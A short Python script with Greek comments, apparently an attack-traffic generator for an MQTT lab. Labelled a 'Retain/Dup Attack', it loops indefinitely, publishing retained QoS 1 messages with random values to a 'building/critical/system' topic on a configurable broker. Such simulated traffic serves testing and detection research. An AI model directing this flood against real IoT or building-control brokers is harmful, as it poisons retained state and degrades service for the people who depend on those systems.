import json
from random import random
import paho.mqtt.client as mqtt
import time
import random
import socket
import os


# Παίρνουμε το όνομα του Pod
pod_id = socket.gethostname()
BROKER = os.getenv("BROKER_HOST", "emqx")
CLIENT_ID = f"Attack_{os.path.basename(__file__)}_{pod_id}"
# Προαιρετικό delay για να μην ξεκινήσουν όλα μαζί
delay = int(os.getenv("INITIAL_DELAY", "0"))
time.sleep(delay)
client = mqtt.Client(client_id=CLIENT_ID)
client.connect(BROKER, 1883)
client.loop_start()
print("[!] Starting Retain/Dup Attack...")
try:
    while True:
        # Ενεργοποιούμε το retain=True
        # Χρησιμοποιούμε και qos=1 για να προκαλέσουμε ACKs
        payload = {"device_id": CLIENT_ID, "RETAINED_DATA": random.randint(1000, 9999)}
        client.publish(
            "building/critical/system", json.dumps(payload), qos=1, retain=True
        )
        print("Published with Retain=1", CLIENT_ID)
        time.sleep(1)
except KeyboardInterrupt:
    client.disconnect()
